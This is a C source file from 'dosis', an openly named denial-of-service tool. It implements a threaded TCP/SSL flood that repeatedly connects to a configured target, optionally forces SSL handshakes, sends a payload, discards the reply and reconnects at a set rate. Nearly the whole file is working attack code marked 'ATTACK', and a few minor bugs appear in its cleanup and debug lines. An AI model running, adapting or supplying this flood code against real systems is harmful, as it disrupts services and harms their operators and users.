/*****************************************************************************
 * tcp.c
 *
 * TCP (TCP/SSL) connection generator.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.net>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>
#include "dosconfig.h"
#include "dosis.h"
#include "ip.h"
#include "lnet.h"
#include "log.h"
#include "payload.h"
#include "tea.h"

#define DEFAULT_CWAIT           3000000
#define DEFAULT_RWAIT           10000000

#define BUFSIZE 4096

#define DEFAULT_CIPHER_SUITE "DES-CBC3-SHA"

typedef struct _tag_TCP_CFG {
  /* options */
  INET_ADDR          dhost;
  int                sslenabled;

  /* parameters */
  double             hitratio;
  char              *payload;
  unsigned           payload_size;
  char              *sslcipher;

  /* other things */
  int                sock;
  pthreadex_timer_t  timer;
  struct timeval     sockwait_cwait;
  struct timeval     sockwait_rwait;
  struct sockaddr    dsockaddr;

  /* ssl things */
#ifdef HAVE_SSL
  SSL                *ssl;
  SSL_CTX            *ctx;
  BIO                *bio;
#endif
} TCP_CFG;

static char nullbuff[BUFSIZE+1];

/****************************************************************************
 * SSL FUNCS
 *****************************************************************************/

#ifdef HAVE_SSL
static void SSL_error_stack(void) /* recursive dump of the error stack */
{
  unsigned long err;
  char string[120];

  err=ERR_get_error();
  if(!err)
    return;
  SSL_error_stack();
  ERR_error_string(err, string);
}

static void SSL_finalize(THREAD_WORK *tw)
{
  TCP_CFG *tt = (TCP_CFG *) tw->data;

  if(tt)
  {
    if(tt->ssl)
    {
      SSL_shutdown(tt->ssl);
      SSL_free(tt->ssl);
    }
    if(tt->ctx)
      SSL_CTX_free(tt->ctx);
    tt->ssl = NULL;
    tt->bio = NULL;
    tt->ctx = NULL;
  }
}

int SSL_initialize(THREAD_WORK *tw)
{
  TCP_CFG *tt = (TCP_CFG *) tw->data;
  int  serr;

  tt->ssl    = NULL;
  tt->ctx    = NULL;
  tt->bio    = NULL;

  SSL_load_error_strings();
  SSL_library_init();

  if((tt->ctx = SSL_CTX_new(SSLv23_client_method())) == NULL)
  {
    SSL_error_stack();
    TERR("Error creating new ctx.");
    return 1;
  }

  SSL_CTX_set_mode(tt->ctx, SSL_MODE_ENABLE_PARTIAL_WRITE|SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);
  SSL_CTX_set_session_cache_mode(tt->ctx, SSL_SESS_CACHE_BOTH);
  SSL_CTX_set_timeout(tt->ctx, 500000);
  if(!SSL_CTX_set_cipher_list(tt->ctx, tt->sslcipher))
  {
    TERR("SSL_CTX_set_cipher_list");
    return 1;
  }

  if((tt->ssl = SSL_new(tt->ctx)) == NULL)
  {
    SSL_error_stack();
    TERR("Error creating new ssl.");
    return 1;
  }
  SSL_set_fd(tt->ssl, tt->sock);

  tt->bio = BIO_new_socket(tt->sock, BIO_NOCLOSE);
  SSL_set_bio(tt->ssl, tt->bio, tt->bio);

  serr = SSL_connect(tt->ssl);
  return 0;
}
#endif

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

static void tcp__thread(THREAD_WORK *tw)
{
  fd_set socks;
  int sopts, r;
  TCP_CFG *tt = (TCP_CFG *) tw->data;
  struct timeval sockwait;

  TDBG("Started sender thread");

  /* ATTACK */
  while(1)
  {
    /* wait for work */
    if(tt->hitratio > 0)
      if(pthreadex_timer_wait(&(tt->timer)) < 0)
        TERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /*** CONNECTION **********************************************************/
    TDBG("  Connecting...");

    /* Set timeout for select */
    memcpy(&sockwait, &tt->sockwait_cwait, sizeof(struct timeval));
    tt->sock = socket(PF_INET, SOCK_STREAM, 0);
    if(tt->sock < 0)
    {
      TERR("socket() failed (%s)", strerror(errno));
      continue;
    }

    /* Execute connection, but before set non block */
    sopts = fcntl(tt->sock, F_GETFL);
    fcntl(tt->sock, F_SETFL, sopts | O_NONBLOCK);

    if(connect(tt->sock, &tt->dsockaddr, sizeof(struct sockaddr_in)) < 0
    && errno != EINPROGRESS)
    {
      TERR("connect() 1 failed:%s", strerror(errno));
      close(tt->sock);
      continue;
    } else
      TDBG2("connect() sent!");

    /* connection is completed or in progress... */
    fcntl(tt->sock, F_SETFL, sopts);
    FD_ZERO(&socks);
    FD_SET(tt->sock, &socks);
    if((r = select(tt->sock + 1, NULL, &socks, NULL, &sockwait)) < 1)
    {
      TDBG("connection timed out.");
      close(tt->sock);
      continue;
    }

    /* second connect() to check connection */
    fcntl(tt->sock, F_SETFL, sopts | O_NONBLOCK);
    if(connect(tt->sock, &tt->dsockaddr, sizeof(struct sockaddr_in)) < 0)
    {
      /* XXX: Se puede llegar aqui porque aún no ha conectado :) */
      TERR("connect() 2 failed: %s", strerror(errno));
      close(tt->sock);
      continue;
    }
    fcntl(tt->sock, F_SETFL, sopts);
 
    /*** DATA SEND AND RECV **************************************************/
    TDBG2("prepared to send data...");
    if(tt->sslenabled)
    {
#ifdef HAVE_SSL
    TDBG2("  ssl data...");
      /* close any opened ssl conn */
      SSL_finalize(tw);

      /* Create SSL connection over this socket */
      if((r = SSL_initialize(tw)) != 0)
      {
        TERR("SSL_initialize error (%d)", r);
        continue;
      }

      /* Send request */
    TDBG2("  going to write...");
      r = SSL_write(tt->ssl, tt->payload, tt->payload_size);
      if(r < tt->payload_size)
      {
        TERR("SSL_write error.");
        continue;
      }
#else
      TFAT("Not compiled with SSL support.");
#endif
    } else {
      /* send request */
      r = send(tt->sock, (void *) tt->payload, tt->payload_size, 0);
      if(r < tt->payload_size)
      {
        TERR("Send error.");
        continue;
      }
    }

    /* READ DATA ***********************************************************/
    TDBG("  Reading data...");
    /* reestablish timeouts */
    memcpy(&sockwait, &tt->sockwait_rwait, sizeof(struct timeval));
    r = select(tt->sock+1, &socks, NULL, NULL, &sockwait);
    if(!FD_ISSET(tt->sock, &socks))
    {
      TERR("select() error %d: %s", r, strerror(errno));
      continue;
    }
    fcntl(tt->sock,F_SETFL,sopts);

    /* Rediret to /dev/null :) */
    while((r = read(tt->sock, nullbuff, sizeof(nullbuff))) > 0)
      TDBG2("  read %d bytes...", r);

    /* Hemos terminado */
    TDBG("  Closing connection.");
    if(close(tt->sock) != 0)
      TERR("error on close(): %s", strerror(errno));
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcp__configure(THREAD_WORK *tw, SNODE *command)
{
  TCP_CFG *tt = (TCP_CFG *) tw->data;
  SNODE *cn;
  char *s;

  /* first initialization (specialized work thread data) */
  if(tt == NULL)
  {
    if((tt = calloc(1, sizeof(TCP_CFG))) == NULL)
      TFAT("No memory for TCP_CFG.");
    tw->data = (void *) tt;

    tt->sockwait_cwait.tv_sec  = DEFAULT_CWAIT / 1000000;
    tt->sockwait_cwait.tv_usec = DEFAULT_CWAIT % 1000000;
    tt->sockwait_rwait.tv_sec  = DEFAULT_RWAIT / 1000000;
    tt->sockwait_rwait.tv_usec = DEFAULT_RWAIT % 1000000;

    /* init timer */
    pthreadex_timer_init(&(tt->timer), 0.0);
  }

  /* read from SNODE command parameters */
  cn = command->command.thc.to->to.pattern;
  if(cn->type != TYPE_PERIODIC_LIGHT)
    TFAT("%d: Uknown pattern %d.", cn->line, cn->type);
  
  tt->hitratio = tea_get_float(cn->pattern.periodic.ratio);
  if(tt->hitratio < 0)
    TFAT("%d: Bad hit ratio '%f'.", cn->line, tt->hitratio);

  /* read from SNODE command options */
  for(cn = command->command.thc.to->to.options; cn; cn = cn->option.next)
    switch(cn->type)
    {
      case TYPE_OPT_SSL:
        tt->sslenabled = -1;
        if(tt->sslcipher)
        {
          free(tt->sslcipher);
          tt->sslcipher = NULL;
        }
        if(cn->option.sslcipher)
          tt->sslcipher = tea_get_string(cn->option.sslcipher);
        break;

      case TYPE_OPT_DST:
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tt->dhost))
          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tt->dhost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_PAYLOAD_FILE:
      case TYPE_OPT_PAYLOAD_RANDOM:
      case TYPE_OPT_PAYLOAD_STR:
        payload_get(cn, &tt->payload, &tt->payload_size);
        break;

      case TYPE_OPT_CWAIT:
        {
          int t;
          t = tea_get_int(cn->option.cwait);
          if(t < 0)
            TFAT("%d: Bad connection wait (CWAIT) '%d'.", cn->line, t);
          tt->sockwait_cwait.tv_sec  = t / 1000000;
          tt->sockwait_cwait.tv_usec = t % 1000000;
        }
        break;

      case TYPE_OPT_RWAIT:
        {
          int t;
          t = tea_get_int(cn->option.rwait);
          if(t < 0)
            TFAT("%d: Bad read wait (RWAIT) '%d'.", cn->line, t);
          tt->sockwait_rwait.tv_sec  = t / 1000000;
          tt->sockwait_rwait.tv_usec = t % 1000000;
        }
        break;

      default:
        TFAT("%d: Uknown option %d.", cn->line, cn->type);
    }

  /* check dst address and configure socket */
  if(tt->dhost.type == INET_FAMILY_NONE)
    TFAT("I need a target address.");
  ip_addr_to_socket(&tt->dhost, &tt->dsockaddr);

  if(tt->sslenabled && !tt->sslcipher)
    if((tt->sslcipher = strdup(DEFAULT_CIPHER_SUITE)) == NULL)
      TFAT("No mem for SSL cipher suite description.");

  /* calculate timeout */

  /* configure timer */
  if(tt->hitratio > 0)
    pthreadex_timer_set_frequency(&(tt->timer), tt->hitratio);

  /* (debug) print configuration */
  {
    char buff[255];

    TDBG2("config.periodic.ratio = %d", tt->hitratio);
    ip_addr_snprintf(&tt->dhost, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost  = %s", buff);
  }

  return 0;
}

static void tcp__cleanup(THREAD_WORK *tw)
{
  TCP_CFG *tt = (TCP_CFG *) tw->data;

  /* collect libnet data */
  pthreadex_timer_destroy(&tt->timer);

#ifdef HAVE_SSL
  if(tt->sslenabled)
    SSL_finalize(tt);
#endif
  if(tt->sslcipher)
    free(tt->sslcipher);

  if(tt->payload)
  {
    free(tt->payload);
    tt->payload = NULL;
  }
  free(tt);
  tw->data = NULL;

  TDBG("Finalized.");
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TCP TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TEA_OBJECT teaTCP = {
  .name         = "TCP",
  .configure    = tcp__configure,
  .cleanup      = tcp__cleanup,
  .thread       = tcp__thread,
};

